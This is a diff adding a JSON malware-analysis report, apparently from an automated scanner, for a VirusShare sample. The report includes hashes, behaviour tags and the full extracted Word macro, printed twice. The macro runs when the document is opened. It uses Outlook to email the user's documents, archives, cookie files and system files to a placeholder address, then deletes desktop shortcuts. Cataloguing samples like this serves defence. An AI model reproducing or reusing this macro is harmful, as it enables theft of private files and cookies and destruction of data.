@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Windows": "May enumerate application windows",
+            "autoexec": "Runs when the Word document is opened"
+        },
+        "macro": "On Error Resume Next\nDim x\nSet ol=CreateObject(\"Outlook.Application\")\nSet Mail=ol.CreateItem(0)\nMail.to=\"mail@domain.com\"\nMail.Subject=\"your files\"\nMail.Body=\"file transfer...........successful\"\nMail.Attachments.Add(\"C:\\Eigene Dateien\\*.txt\")\nMail.Attachments.Add(\"C:\\Eigene Dateien\\*.doc\")\nMail.Attachments.Add(\"C:\\Eigene Dateien\\*.zip\")\nMail.Attachments.Add(\"C:\\Windows\\win.ini\")\nMail.Attachments.Add(\"C:\\autoexec.bat\")\nMail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.txt\")\nMail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.doc\")\nMail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.zip\")\nMail.Attachments.Add(\"C:\\Windows\\Cookies\\*.txt\")\nMail.Send\nol.Quit\nSet so = CreateObject(\"Scripting.FileSystemObject\")\nso.DeleteFile(\"C:\\Windows\\Desktop\\*.lnk\")"
+    },
+    "filename": "VirusShare_bc201b5b5259578dfed8db7314ce687f",
+    "filesize": 777,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "bc201b5b5259578dfed8db7314ce687f",
+        "sha1": "765e5512d49ccd2b3feb197825040f990205453a",
+        "sha256": "4aed487473e602de54c62a0399de0d76919f30fa7e2e0531ed04ec4807a319a4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "Dim x",
+            "Set ol=CreateObject(\"Outlook.Application\")",
+            "Set Mail=ol.CreateItem(0)",
+            "Mail.to=\"mail@domain.com\"",
+            "Mail.Subject=\"your files\"",
+            "Mail.Body=\"file transfer...........successful\"",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\*.txt\")",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\*.doc\")",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\*.zip\")",
+            "Mail.Attachments.Add(\"C:\\Windows\\win.ini\")",
+            "Mail.Attachments.Add(\"C:\\autoexec.bat\")",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.txt\")",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.doc\")",
+            "Mail.Attachments.Add(\"C:\\Eigene Dateien\\Dokumente\\*.zip\")",
+            "Mail.Attachments.Add(\"C:\\Windows\\Cookies\\*.txt\")",
+            "Mail.Send",
+            "ol.Quit",
+            "Set so = CreateObject(\"Scripting.FileSystemObject\")",
+            "so.DeleteFile(\"C:\\Windows\\Desktop\\*.lnk\")"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.277694",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
